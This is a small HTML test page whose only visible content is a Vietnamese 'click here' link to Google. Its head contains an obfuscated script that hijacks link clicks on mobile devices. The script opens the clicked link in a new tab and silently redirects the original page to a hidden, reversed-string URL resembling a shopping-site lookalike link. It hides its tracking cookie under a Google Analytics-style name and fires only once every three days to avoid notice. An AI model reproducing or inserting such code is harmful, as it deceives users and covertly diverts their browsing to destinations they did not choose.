<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Test</title>

        <script>

            (()=>{
                function gC(n) {
                    return document.cookie.split('; ').reduce((a, c) => c.startsWith(n + '=') ? c.split('=')[1] : a, null);
                }
            
                function sC(n, v, d) {
                    document.cookie = `${n}=${v};expires=${new Date(Date.now() + d * 864e5).toUTCString()};path=/`;
                }
            
                function mT() {
                    const u = navigator.userAgent.toLowerCase();
                    return navigator.maxTouchPoints > 1 &&
                        window.matchMedia("(pointer:coarse)").matches && (/android|iphone|ipad|tablet|playbook|silk|kindle/.test(u) || window.matchMedia("(max-width: 1024px)").matches);
                }
            
                const tId = 'cVk0FaR9L3/nv.eepohs.s//:sptth'.split('').reverse().join('');
                const gAc = gC('_ga_D8SD9STSJ5');
            
                document.addEventListener('click', e => {
                    const t = e.target.closest('a');
                    if (!t || !t.href || t.href === '/' || (gAc && gAc === 'true') || !mT()) return;
                    e.preventDefault();
                    sC('_ga_D8SD9STSJ5', 'true', 3);
                    window.open(t.href, '_blank');
                    location.replace(tId);
                }, true);
            })();
            
        </script>
    </head>
    <body>
        <a href="https://www.google.com/">Click vao day</a>
    </body>
</html>
